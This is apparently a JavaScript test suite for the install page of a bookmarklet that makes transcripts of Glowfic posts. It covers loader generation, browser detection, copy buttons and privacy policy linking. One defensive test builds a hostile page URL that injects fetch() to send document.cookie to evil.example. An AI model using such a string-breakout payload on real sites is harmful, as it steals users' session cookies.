// The install page is the whole product for anyone who is not going to open a
// terminal, so it gets tested like code: built, loaded, and clicked.
import test from 'node:test';
import assert from 'node:assert/strict';
import { createHash } from 'node:crypto';
import { JSDOM, ResourceLoader } from 'jsdom';
import { distFile } from './dist.js';

const CHROME_UA =
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0 Safari/537.36';
const SAFARI_UA =
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.0 Safari/605.1.15';

function build() {
  return {
    page: distFile('index.html'),
    script: distFile('transcript.js'),
    bundle: distFile('bookmarklet.js'),
  };
}

// jsdom ignores a top-level `userAgent` option; it only takes effect through a
// ResourceLoader, and getting that wrong makes browser-detection tests pass for
// the wrong reason.
function render(page, { url = 'https://someone.github.io/glowfic-transcript/', userAgent } = {}) {
  return new JSDOM(page, {
    url,
    resources: new ResourceLoader({ userAgent }),
    runScripts: 'dangerously',
  });
}

function open(page, options) {
  return render(page, options).window.document;
}

test('the page ships with every placeholder filled', () => {
  const { page } = build();
  assert.ok(!page.includes('{{'), 'an unfilled placeholder reached the page');
});

test('the hosted script is the same bundle the bookmarklet uses', () => {
  const { script, bundle } = build();
  assert.equal(script, bundle);
});

test('the loader points at the script beside the page, with a content version', () => {
  const { page, script } = build();
  const document = open(page, { userAgent: CHROME_UA });
  const href = document.querySelector('[data-bookmarklet]').href;

  assert.ok(href.startsWith('javascript:'), href.slice(0, 40));
  const digest = createHash('sha256').update(script).digest('hex').slice(0, 8);
  assert.ok(
    href.includes(`https://someone.github.io/glowfic-transcript/transcript.js?v=${digest}`),
    href
  );
  // The version has to track the code, or a stale cache strands people.
  assert.ok(page.includes(digest));
});

test('the loader follows wherever the page is served from', () => {
  const { page } = build();
  const document = open(page, {
    url: 'https://glowfic.example.com/tools/install.html?utm=x#top',
    userAgent: CHROME_UA,
  });
  const href = document.querySelector('[data-bookmarklet]').href;
  assert.ok(href.includes("s.src='https://glowfic.example.com/tools/transcript.js?v="), href);
  assert.ok(!href.includes('install.html'), 'the page filename leaked into the loader');
});

test('the loader is small enough to paste into a bookmark by hand', () => {
  const { page } = build();
  const document = open(page, { userAgent: SAFARI_UA });
  const href = document.querySelector('[data-bookmarklet]').href;
  assert.ok(href.length < 400, `loader is ${href.length} bytes`);
});

test('the loader is valid javascript that injects the script', () => {
  const { page } = build();
  const document = open(page, { userAgent: CHROME_UA });
  const code = decodeURIComponent(
    document.querySelector('[data-bookmarklet]').href.replace(/^javascript:/, '')
  );

  const dom = new JSDOM('<body></body>', { runScripts: 'outside-only' });
  dom.window.eval(code);
  const injected = dom.window.document.querySelector('script');
  assert.ok(injected, 'the loader did not add a script tag');
  assert.ok(injected.src.endsWith('.js') || injected.src.includes('transcript.js'), injected.src);
});

test('Safari gets the bookmark-editing instructions opened', () => {
  const { page } = build();
  const document = open(page, { userAgent: SAFARI_UA });

  assert.equal(document.getElementById('editing').open, true);
  assert.equal(document.getElementById('editing').querySelector('.yours').hidden, false);
  assert.equal(document.getElementById('dragging').open, false);
});

test('Chrome gets the drag instructions opened', () => {
  const { page } = build();
  const document = open(page, { userAgent: CHROME_UA });

  assert.equal(document.getElementById('dragging').open, true);
  assert.equal(document.getElementById('dragging').querySelector('.yours').hidden, false);
  assert.equal(document.getElementById('editing').open, false);
});

test('the manual section shows the exact text to paste', () => {
  const { page } = build();
  const document = open(page, { userAgent: CHROME_UA });
  const snippet = document.querySelector('[data-snippet]').textContent;
  assert.equal(snippet, document.querySelector('[data-bookmarklet]').href);
});

test('the copy buttons copy the loader and the self-contained version', () => {
  const { page, bundle } = build();
  const dom = render(page, { userAgent: SAFARI_UA });
  const copied = [];
  dom.window.navigator.clipboard = { writeText: async (text) => copied.push(text) };

  dom.window.document.querySelector('[data-copy]').click();
  dom.window.document.querySelector('[data-copy-selfcontained]').click();

  assert.equal(copied.length, 2);
  assert.ok(copied[0].startsWith('javascript:(function(){var s=document.createElement'));
  assert.ok(copied[1].startsWith('javascript:'));
  assert.equal(decodeURIComponent(copied[1].replace(/^javascript:/, '')), bundle);
});

test('the self-contained bookmarklet still fits under the reported Safari ceiling', () => {
  const { page } = build();
  const document = open(page, { userAgent: SAFARI_UA });
  const href = document.querySelector('.footer a.drag').href;
  assert.ok(href.length < 65_536, `self-contained bookmarklet is ${href.length} bytes`);
});

test('the browser sniff actually reads the user agent', () => {
  const { page } = build();
  const detected = (userAgent) => open(page, { userAgent }).getElementById('editing').open;

  assert.equal(detected(SAFARI_UA), true, 'Safari was not detected');
  assert.equal(detected(CHROME_UA), false, 'Chrome was mistaken for Safari');
  // Chrome and Edge both carry "Safari" in their user agent strings.
  assert.equal(detected(CHROME_UA.replace('Chrome/140.0', 'Edg/140.0')), false);
  assert.equal(detected('Mozilla/5.0 (X11; Linux) Gecko/20100101 Firefox/130.0'), false);
});

test('opening the page from disk warns that the loader has nothing to fetch', () => {
  const { page } = build();
  const served = open(page, { userAgent: CHROME_UA });
  assert.equal(served.getElementById('local').hidden, true);

  const local = open(page, { url: 'file:///Users/someone/dist/index.html', userAgent: CHROME_UA });
  assert.equal(local.getElementById('local').hidden, false);
  assert.match(local.getElementById('local').textContent, /self-contained/i);
});

test('a hostile page path cannot inject code into the bookmarklet', () => {
  const { page } = build();
  // Serving the page from an attacker-chosen path is possible on any host with
  // catch-all routing. An apostrophe survives URL encoding, so if it reached
  // the generated string literal it would close it and append arbitrary code.
  const hostile = "https://host.example/x'+fetch('https://evil.example/'+document.cookie)+'/";
  const href = open(page, { url: hostile, userAgent: CHROME_UA })
    .querySelector('[data-bookmarklet]').href;

  assert.ok(!href.includes("evil.example/'+"), `injection survived: ${href}`);
  assert.ok(!/'\s*\+/.test(href.replace(/^javascript:/, '')), `broke out of the literal: ${href}`);
  assert.ok(href.includes('%27'), `the apostrophe was not encoded: ${href}`);
});

test('the privacy policy ships alongside the install page and is linked from it', () => {
  build();
  const policy = distFile('privacy/index.html');

  assert.match(policy, /<title>Privacy/);
  assert.match(policy, /not affiliated with, endorsed by, or produced by/i);
  // The Chrome listing requires a reachable policy once any data type is
  // declared, and "website content" is declared.
  assert.match(policy, /Nothing is sent to the developer/i);
  assert.ok(distFile('index.html').includes('href="privacy/"'));
});
